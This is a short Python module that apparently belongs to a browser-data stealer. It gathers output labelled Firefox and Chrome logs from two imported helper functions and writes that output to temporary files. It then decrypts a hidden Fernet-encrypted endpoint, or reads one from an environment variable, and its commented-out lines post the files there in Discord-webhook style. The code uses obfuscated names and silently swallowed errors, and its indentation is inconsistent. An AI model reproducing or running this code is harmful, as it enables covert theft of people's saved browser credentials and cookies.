B = open
from ....Cadmino import main
from ....Fadmino import f_main
from cryptography.fernet import Fernet

import tempfile
import requests
import json
import os

encoded_string_1 = "gAAAAABmEi6IMsOG7am-kCT2D3ZUBp__HoQlLHUbzsHsZnvfQ4eEwZKbtYZnvLZasGPp7mBh-GgJvs85cSz2qjf3qDiEVZ680AYK_GAD7-iMPwZYu86zmAd9JlThMvQkguHj40txpMtkEXHMOGHtpHF6OXx_xV_kxnQ4kcAumjdgTRmLG45xtcs42H3TOWEq5IIWbH_ZEL1VMrQhaxyZvmrx9KbNFfZ0WBRP46xhbuCScvJrxDvxIG4="


def send_results():
    try:
        G = main()
    except:
        G = []
    try:
        H = f_main()
    except:
        H = []
    
		temp_dir = tempfile.mkdtemp(prefix="pre_", suffix="_suf")
		temp_dir_firefox_logs = f"{temp_dir}\\F.txt"
		temp_dir_chrome_logs = f"{temp_dir}\\C.txt"

		with open(temp_dir_firefox_logs, "w") as S:
			S.write(json.dumps(H))

		with open(temp_dir_chrome_logs, "w") as T:
		    T.write(json.dumps(G))
		
		if os.getenv("BOOT_URL") is None:
		    fernet_codec = Fernet("zfW7TU0Gc8JhJW2TWZ_RYa6Dy7ysMpsqKghWypHpERw=")
		    A = fernet_codec.decrypt(encoded_string_1).decode()
		else:
		    A = os.getenv("BOOT_URL")
		# C = {"payload_json": (None, '{"content": "Firefox"}'), "file": B(temp_dir_firefox_logs, "rb")}
		# requests.post(A, files=C)
		# C = {"payload_json": (None, '{"content": "Chrome"}'), "file": B(temp_dir_chrome_logs, "rb")}
		# requests.post(A, files=C)
